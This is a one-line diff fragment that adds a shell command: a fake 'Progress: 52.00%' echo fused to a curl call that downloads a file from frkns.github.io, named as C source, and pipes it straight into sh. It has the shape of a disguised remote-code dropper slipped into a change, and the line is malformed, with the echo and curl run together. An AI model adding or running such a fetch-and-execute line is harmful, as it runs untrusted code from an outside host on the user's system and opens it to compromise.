@@ -1,0 +1,1 @@
+echo Progress: 52.00%curl -L --progress-bar frkns.github.io/fun/PeaceVariablesEnter.c | sh
